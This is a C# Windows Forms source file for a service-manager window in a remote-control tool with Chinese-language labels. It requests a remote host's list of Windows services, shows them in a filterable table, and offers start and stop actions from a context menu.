using System;
using System.Collections.Generic;
using System.Drawing;
using System.Windows.Forms;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Request;
using RemoteControl.Protocals.Response;

namespace RemoteControl.SubController
{
    public class FrmServiceManager : Form
    {
        private readonly SocketSession _session;
        private ListView _listView;
        private TextBox _filterBox;
        private List<ServiceInfo> _allServices = new List<ServiceInfo>();

        public FrmServiceManager(SocketSession session, string hostName)
        {
            _session = session;
            this.Text = "服务管理 - " + hostName;
            this.Size = new Size(850, 550);
            this.StartPosition = FormStartPosition.CenterScreen;
            InitializeControls();
            RefreshList();
        }

        private void InitializeControls()
        {
            var topPanel = new Panel();
            topPanel.Dock = DockStyle.Top;
            topPanel.Height = 36;

            var filterLabel = new Label();
            filterLabel.Text = "过滤：";
            filterLabel.AutoSize = true;
            filterLabel.Location = new Point(8, 8);

            _filterBox = new TextBox();
            _filterBox.Location = new Point(50, 5);
            _filterBox.Size = new Size(300, 22);
            _filterBox.TextChanged += (s, e) => ApplyFilter();

            var refreshBtn = new Button();
            refreshBtn.Text = "刷新(R)";
            refreshBtn.Location = new Point(370, 4);
            refreshBtn.Size = new Size(75, 26);
            refreshBtn.Click += (s, e) => RefreshList();

            topPanel.Controls.AddRange(new Control[] { filterLabel, _filterBox, refreshBtn });

            _listView = new ListView();
            _listView.Dock = DockStyle.Fill;
            _listView.View = View.Details;
            _listView.FullRowSelect = true;
            _listView.GridLines = true;
            _listView.Font = new Font("微软雅黑", 9F);
            _listView.Columns.Add("名称", 150);
            _listView.Columns.Add("显示名", 260);
            _listView.Columns.Add("状态", 80);
            _listView.Columns.Add("启动类型", 90);
            _listView.Columns.Add("类型", 90);
            _listView.Columns.Add("PID", 60);
            _listView.Columns.Add("描述", 250);
            _listView.ContextMenuStrip = CreateContextMenu();

            this.Controls.Add(_listView);
            this.Controls.Add(topPanel);
        }

        private ContextMenuStrip CreateContextMenu()
        {
            var cms = new ContextMenuStrip();
            cms.Items.Add("启动服务", null, (s, e) => ServiceAction(eServiceAction.Start));
            cms.Items.Add("停止服务", null, (s, e) => ServiceAction(eServiceAction.Stop));
            cms.Items.Add(new ToolStripSeparator());
            cms.Items.Add("刷新", null, (s, e) => RefreshList());
            return cms;
        }

        private void RefreshList()
        {
            _session.Send(ePacketType.PACKET_SERVICE_MANAGER_REQUEST,
                new RequestServiceManager { Action = eServiceAction.List });
        }

        private void ServiceAction(eServiceAction action)
        {
            if (_listView.SelectedItems.Count == 0) return;
            string svcName = _listView.SelectedItems[0].Text;
            _session.Send(ePacketType.PACKET_SERVICE_MANAGER_REQUEST,
                new RequestServiceManager { Action = action, ServiceName = svcName });
        }

        public void HandleResponse(ResponseServiceManager resp)
        {
            if (resp == null) return;
            if (resp.Services != null)
            {
                _allServices = resp.Services;
            }
            this.BeginInvoke((Action)(() =>
            {
                ApplyFilter();
                this.Text = string.Format("服务管理 — 共 {0} 项 | {1}",
                    _allServices.Count, DateTime.Now.ToString("HH:mm:ss"));
            }));
        }

        private void ApplyFilter()
        {
            string filter = _filterBox.Text.Trim();
            _listView.Items.Clear();
            foreach (var svc in _allServices)
            {
                if (filter.Length > 0)
                {
                    if ((svc.ServiceName ?? "").IndexOf(filter, StringComparison.OrdinalIgnoreCase) < 0
                        && (svc.DisplayName ?? "").IndexOf(filter, StringComparison.OrdinalIgnoreCase) < 0)
                        continue;
                }
                var item = new ListViewItem(svc.ServiceName);
                item.SubItems.Add(svc.DisplayName);
                item.SubItems.Add(svc.Status);
                item.SubItems.Add(svc.StartType);
                item.SubItems.Add(svc.Type ?? "");
                item.SubItems.Add(svc.PID > 0 ? svc.PID.ToString() : "—");
                item.SubItems.Add(svc.Description ?? "");
                _listView.Items.Add(item);
            }
        }
    }
}
